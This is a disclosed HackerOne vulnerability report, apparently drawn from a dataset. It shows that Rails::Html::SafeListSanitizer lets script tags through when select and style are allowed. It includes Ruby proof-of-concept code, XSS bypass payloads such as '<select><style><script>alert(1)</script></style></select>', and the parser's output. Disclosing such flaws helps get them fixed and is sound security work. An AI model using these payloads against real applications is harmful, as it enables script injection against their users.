---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1599573'
original_report_id: '1599573'
title: Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that
  allows the style tag
weakness: Cross-site Scripting (XSS) - Generic
team_handle: ibb
created_at: '2022-06-14T04:11:59.090Z'
disclosed_at: '2022-06-27T11:46:04.755Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
asset_identifier: https://github.com/rails
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag

## Metadata

- HackerOne Report ID: 1599573
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: ibb
- Disclosed At: 2022-06-27T11:46:04.755Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

It seems to be a problem caused by a difference between the nokogiri java implementation and the ruby implementation.

jruby9.3.3.0 (nokogiri java), use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag
code
```
tags = %w(select style)
puts "------------------------------------------------------------------"
puts "use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag"
puts "input: <select<style/>W<xmp<script>alert(1)</script>"
puts "output: "+Rails::Html::SafeListSanitizer.new.sanitize("<select<style/>W<xmp<script>alert(1)</script>", tags: tags).to_s
puts "------------------------------------------------------------------"
```

result
```
input: <select<style/>W<xmp<script>alert(1)</script>
scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :W
scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :&lt;script&gt;alert(1)&lt;/script&gt;
scrub --> node type :Nokogiri::XML::Element, node name :xmp, node to_s :<xmp>&lt;script&gt;alert(1)&lt;/script&gt;</xmp>
scrub --> node type :Nokogiri::XML::Element, node name :style, node to_s :<style>W<script>alert(1)</script></style>
scrub --> node type :Nokogiri::XML::Element, node name :select, node to_s :<select><style>W<script>alert(1)</script></style></select>
output: <select><style>W<script>alert(1)</script></style></select>
```

This is a problem for CRuby as well if you use straightforward HTML that doesn't depend on how the parser corrects broken markup.

```
frag = "<select><style><script>alert(1)</script></style></select>"
tags = %w(select style)
puts Rails::Html::SafeListSanitizer.new.sanitize(frag, tags: tags)
```

outputs

```
<select><style><script>alert(1)</script></style></select>
```

on both CRuby and JRuby.

## Impact

It is possible to bypass Rails::Html::SafeListSanitizer filtering and perform an XSS attack.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
